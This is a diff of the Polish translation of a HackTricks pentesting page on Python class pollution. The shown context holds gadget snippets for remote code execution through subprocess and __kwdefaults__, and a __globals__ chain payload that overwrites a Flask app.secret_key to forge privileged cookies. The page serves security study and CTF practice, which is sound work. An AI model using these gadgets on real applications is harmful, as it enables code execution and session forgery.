@@ -1,10 +1,10 @@
-# Zanieczyszczenie klas (Zanieczyszczenie prototypów Pythona)
+# Class Pollution (Python's Prototype Pollution)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Podstawowy przykład
+## Basic Example
 
-Sprawdź, jak możliwe jest zanieczyszczenie klas obiektów za pomocą ciągów:
+Sprawdź, jak można zanieczyszczać klasy obiektów za pomocą stringów:<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -28,7 +28,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## Podstawowy Przykład Luki
+## Podstawowy przykład podatności
 ```python
 # Initial state
 class Employee: pass
@@ -61,11 +61,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Przykłady gadżetów
+## Przykłady Gadgetów
 
 <details>
 
-<summary>Tworzenie domyślnej wartości właściwości klasy do RCE (subprocess)</summary>
+<summary>Tworzenie domyślnej wartości właściwości klasy w celu RCE (subprocess)</summary><sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +116,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>Zanieczyszczanie innych klas i zmiennych globalnych za pomocą <code>globals</code></summary>
+<summary>Zanieczyszczanie innych klas i globalnych zmiennych za pomocą <code>globals</code></summary><sup>[[1]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +148,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>Arbitralne wykonywanie podprocesów</summary>
+<summary>Dowolne wykonywanie procesów podrzędnych</summary><sup>[[1]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -182,7 +182,7 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <summary>Nadpisywanie <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** jest specjalnym atrybutem wszystkich funkcji, opartym na dokumentacji Pythona, jest to „mapowanie wszelkich wartości domyślnych dla parametrów **tylko słów kluczowych**”. Zanieczyszczenie tego atrybutu pozwala nam kontrolować domyślne wartości parametrów tylko słów kluczowych funkcji, są to parametry funkcji, które pojawiają się po \* lub \*args.
+**`__kwdefaults__`** to specjalny atrybut wszystkich funkcji. Zgodnie z [dokumentacją Pythona](https://docs.python.org/3/library/inspect.html) jest to „mapowanie wszelkich wartości domyślnych dla parametrów **tylko słów kluczowych**”. Zanieczyszczenie tego atrybutu pozwala nam kontrolować wartości domyślne parametrów tylko słów kluczowych funkcji, czyli parametrów funkcji występujących po \* lub \*args.<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,32 +223,34 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>Nadpisywanie sekretu Flask w różnych plikach</summary>
+<summary>Nadpisywanie secret Flask między plikami</summary>
 
-Więc, jeśli możesz przeprowadzić zanieczyszczenie klasy na obiekcie zdefiniowanym w głównym pliku python aplikacji webowej, ale **której klasa jest zdefiniowana w innym pliku** niż główny. Ponieważ aby uzyskać dostęp do \_\_globals\_\_ w poprzednich ładunkach, musisz uzyskać dostęp do klasy obiektu lub metod klasy, będziesz mógł **uzyskać dostęp do globals w tym pliku, ale nie w głównym**. \
-Dlatego **nie będziesz mógł uzyskać dostępu do globalnego obiektu aplikacji Flask**, który zdefiniował **klucz sekretu** na głównej stronie:
+Jeśli więc możesz wykonać class pollution na obiekcie zdefiniowanym w głównym pliku python webowej aplikacji, ale **jego klasa jest zdefiniowana w innym pliku** niż plik główny. Ponieważ aby uzyskać dostęp do \_\_globals\_\_ w poprzednich payloadach, musisz uzyskać dostęp do klasy obiektu lub metod tej klasy, będziesz w stanie **uzyskać dostęp do globals w tym pliku, ale nie w pliku głównym**. \
+W związku z tym **nie będziesz w stanie uzyskać dostępu do globalnego obiektu aplikacji Flask**, który zdefiniował **secret key** na stronie głównej:<sup>[[1]](#references)</sup>
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-W tym scenariuszu potrzebujesz gadżetu do przeszukiwania plików, aby dotrzeć do głównego, aby **uzyskać dostęp do globalnego obiektu `app.secret_key`**, aby zmienić klucz tajny Flask i móc [**eskalować uprawnienia** znając ten klucz](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+W tym scenariuszu potrzebujesz gadgetu do przechodzenia przez pliki, aby dotrzeć do głównego pliku i **uzyskać dostęp do globalnego obiektu `app.secret_key`**, zmienić Flask secret key i móc [**escalate privileges** po poznaniu tego klucza](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-Payload taki jak ten [z tego opisu](https://ctftime.org/writeup/36082):
+Payload taki jak ten [z tego writeupu](https://ctftime.org/writeup/36082):<sup>[[2]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-Użyj tego ładunku, aby **zmienić `app.secret_key`** (nazwa w twojej aplikacji może być inna), aby móc podpisywać nowe i bardziej uprzywilejowane ciasteczka flask.
+Użyj tego payloadu, aby **zmienić `app.secret_key`** (nazwa w Twojej aplikacji może być inna) i móc podpisywać nowe cookies Flask z większymi uprawnieniami.
 
 </details>
 
-Sprawdź także następującą stronę w celu uzyskania dodatkowych gadżetów tylko do odczytu:
+Sprawdź również następującą stronę, aby poznać więcej read-only gadgets:
+
 
 {{#ref}}
 python-internal-read-gadgets.md
 {{#endref}}
 
-## Odniesienia
+## Referencje
 
-- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
 
 {{#include ../../banners/hacktricks-training.md}}
